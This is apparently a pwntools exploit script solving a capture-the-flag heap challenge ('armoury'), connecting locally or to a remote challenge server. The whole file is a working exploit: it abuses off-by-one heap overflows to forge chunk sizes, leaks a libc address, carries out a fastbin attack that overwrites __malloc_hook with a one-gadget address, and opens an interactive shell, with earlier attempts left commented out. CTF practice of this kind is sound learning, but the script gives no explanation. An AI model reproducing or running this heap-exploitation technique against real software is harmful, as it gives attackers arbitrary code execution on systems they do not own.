import pwn

pwn.context.terminal = ["tmux", "splitw", "-h"]

elf = pwn.ELF("./armoury")
libc = pwn.ELF("./libc.so.6")

if pwn.args.GDB:
    p = pwn.gdb.debug(elf.path, """c\n""")
elif pwn.args.REMOTE:
    p = pwn.remote("gc1.eng.run", 32583)
else:
    p = pwn.process(elf.path)


def create(size, content):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b": ")
    p.sendline(str(size).encode())
    p.recvuntil(b": ")
    p.sendline(content)
    p.recvuntil(b"Index ")
    return int(p.recvline()[:-1])


def delete(idx):
    p.recvuntil(b">")
    p.sendline(b"2")
    p.recvuntil(b": ")
    p.sendline(str(idx).encode())


def view(idx):
    p.recvuntil(b">")
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(str(idx).encode())
    p.recvline()
    return p.recvline()[:-1]


# overflow = create(0x88, b"\n")
# victim = create(0x1FF, b"\n")
# consolidate = create(0x88, b"\n")
# guard = create(0x18, b"\n")
# # fastbin = create(0x68, b"\n")
# # guard2 = create(0x18, b"\n")
# # delete(fastbin)
# delete(victim)
# delete(overflow)
# overflow = create(0x88, b"Y" * 0x88)
# victimA = create(0xF8, b"\n")
# victimB = create(0xF8, b"\n")
# delete(victimA)
# delete(consolidate)
# free_later = create(0xF8, b"\n")
# libc_leak = pwn.unpack(view(victimB), "all")
# libc.address = libc_leak - 0x3C4B78
# pwn.log.success("LIBC_ADDRESS: " + hex(libc.address))
# delete(free_later)
# large = create(
#     0x1FF,
#     b"AAAAAAAABBBBBBBB" * 0xF  # padding
#     + pwn.p64(0x100)
#     + pwn.p64(0x91)
#     + b"X" * 0x88
#     + pwn.p64(0x21)
#     + pwn.p64(0x0) * 3
#     + pwn.p64(0x21),
# )
# delete(large)
# # delete(victimB)
# create(0xF8, b"\n")
# fast = create(0x68, pwn.p64(0) * 2)
# # delete(victimB)
# delete(fast)
print(create(0xF8, b"A" * 0xF8))  # 0
print(create(0x68, b"B" * 0x68))  # 1
print(create(0xF8, b"C" * 0xF8))  # 2
print(create(0x10, b"D" * 0x10))  # 3
delete(0)
delete(1)
print(create(0x68, b"B" * 0x68))  # 0
for i in range(0x66, 0x5F, -1):
    delete(0)
    print(create(i + 2, b"B" * i + b"\x70\x01"))  # 0
delete(2)
print(create(0xF6, b"E" * 0xF6))  # 1
libc_leak = pwn.unpack(view(0), "all")
print(hex(libc_leak))
libc.address = libc_leak - 0x3C4B78
pwn.log.success("LIBC_ADDRESS: " + hex(libc.address))
for i in range(0xFD, 0xF7, -1):
    delete(1)
    print(create(i + 1, b"E" * i + b"\x70"))  # 1
delete(0)
delete(1)
foo = 0xDEADBEEF
# create(0x108, b"F" * 0x100 + pwn.p64(foo))  # 0
hook = libc.sym["__malloc_hook"] - 0x23
print(pwn.p64(hook))
print(create(0x107, b"F" * 0x100 + pwn.p64(hook)[:-1]))  # 0
for i in range(0xFE, 0xF7, -1):
    delete(0)
    print(create(i + 1, b"F" * i + pwn.p8(0x70)))  # 0

create(0x68, b"B" * 0x68)
# foo = 0xB00BB00B
# create(0x68, b"G" * 0x13 + pwn.p64(foo) + 0x4D * b"G")
# create(0x20, "trigger __malloc_hook")
oneshot = libc.address + 0xF03A4  # 0x4527A    # 0xf1247 # 0x45226
create(0x68, b"\0" * 0x13 + pwn.p64(oneshot) + 0x4D * b"\0")
# create(0x20, b"trigger exploit")
p.interactive()
